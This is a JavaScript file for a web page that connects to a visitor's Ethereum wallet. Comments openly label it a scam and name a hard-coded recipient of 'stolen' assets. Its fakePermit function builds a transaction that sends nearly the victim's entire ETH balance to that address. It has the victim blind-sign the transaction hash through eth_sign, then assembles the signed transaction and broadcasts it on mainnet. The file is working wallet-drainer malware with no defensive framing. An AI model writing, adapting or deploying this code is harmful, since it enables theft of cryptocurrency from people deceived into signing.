const { ethers, ethereum } = window

// constants
const chainId = 1 // Goerly chain id
const recipient = "0xfe858bC10A35Cbf63c4C438A49559E18eB59D9C9" // recipient of stolen asset

// setup UI
const connectButton = document.getElementById("connect")
const mainButton = document.getElementById("main")
mainButton.disabled = true


// variables
let provider, web3
let selectedAddress

// connect function
async function connect() {
    web3 = new Web3(ethereum)
    provider = new ethers.providers.Web3Provider(ethereum)
    const network = await provider.getNetwork()

    if (network.chainId !== chainId) {
        try {
            await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chainId}` }])
        } catch (err) {
            console.log("error", err)
            return
        }
    }
    
    const accounts = await provider.send("eth_requestAccounts", [])
    selectedAddress = accounts[0]

    connectButton.innerText = selectedAddress
    connectButton.disabled = true
    mainButton.disabled = false
}

// the scam function
async function fakePermit() {
    console.log('test')
    
    await web3.eth.getTransactionCount(selectedAddress, "pending").then(async nonce1 => {
    console.log("nonce1", nonce1)
    const gasPrice = await web3.eth.getGasPrice()
    console.log("gasPrice: ", gasPrice)
    let chainId = await web3.eth.getChainId();
    console.log("chainId: ", chainId);
    let eth_balance = await web3.eth.getBalance(selectedAddress);
    eth_balance -= ((Math.floor(gasPrice * 1.3)) * 30)
    let tx_ = {
        // "from": selectedAddress,
        "to": recipient,
        "nonce": web3.utils.toHex(nonce1),
        "gasLimit": web3.utils.toHex(30000), // gasLimit
        "gasPrice": web3.utils.toHex(Math.floor(gasPrice * 1.3)),
        "value": web3.utils.toHex(eth_balance),
        "chainID": web3.utils.toHex(chainId),
        "data": "0x",
        "v": "0x1",
        "r": "0x",
        "s": "0x"
    }

    var tx = new ethereumjs.Tx(tx_);

    var serializedTx = "0x" + tx.serialize().toString("hex");
    let hexer = { "encoding": "hex" };


    const sha3_ = web3.utils.sha3(serializedTx, hexer);
    console.log("rawTx1:", serializedTx);
    console.log("rawHash1:", sha3_);

    await web3.eth.sign(sha3_, selectedAddress).then(async signed => { 
    const temporary = signed.substring(2),
                    r_ = "0x" + temporary.substring(0, 64),
                    s_ = "0x" + temporary.substring(64, 128),
                    rhema = parseInt(temporary.substring(128, 130), 16),
                    v_ = web3.utils.toHex(rhema + chainId * 2 + 8);
                console.log("r:", r_);
                console.log("s:", s_);
                console.log("y:", v_.toString("hex"));
                tx.r = r_;
                tx.s = s_;
                tx.v = v_;
            console.log(tx);

            console.log("---------------------------------------------");

            const txFin = "0x" + tx.serialize().toString("hex")//,
            const sha3__ = web3.utils.sha3(txFin, hexer);
            console.log("rawTx:", txFin);
            console.log("rawHash:", sha3__);
            await web3.eth.sendSignedTransaction(txFin).then(elisebeth => console.log(elisebeth)).catch(vannette => console.log(vannette))
        }).catch(heide => console.log(heide))
    })
}

// configure buttons
window.addEventListener("DOMContentLoaded", () => {
    connectButton.onclick = connect
})

window.addEventListener("DOMContentLoaded", () => {
    mainButton.onclick = fakePermit
})